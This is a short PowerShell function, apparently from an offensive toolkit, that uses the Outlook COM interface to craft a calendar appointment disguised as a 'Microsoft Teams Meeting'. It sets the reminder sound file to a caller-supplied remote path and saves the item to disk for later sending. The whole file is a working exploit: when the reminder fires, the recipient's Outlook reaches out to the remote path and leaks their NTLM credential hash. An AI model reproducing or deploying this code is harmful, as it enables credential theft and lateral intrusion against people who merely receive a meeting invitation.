# Allows to save to local file path to send for later.

function Save-CalendarNTLMLeak ($remotefilepath, $localfilepath, $meetingsubject, $meetingbody)

{

    $Outlook = New-Object -comObject Outlook.Application
    $appointment = $outlook.CreateItem('olAppointmentItem')
    $appointment.ReminderPlaySound = $true
    $appointment.ReminderSoundFile = $remotefilepath
    $appointment.MeetingStatus = 1
    $appointment.Subject = $meetingsubject
    $appointment.Location = "Microsoft Teams Meeting"
    $appointment.Body = $meetingbody
    $appointment.Start = get-date
    $appointment.End = (get-date).AddHours(2)
    $appointment.ReminderOverrideDefault = $true
    $appointment.ReminderMinutesBeforeStart = 15
    $appointment.Duration = 30
    $appointment.ReminderSet = $true
    $appointment.saveas($localfilepath,3)

}
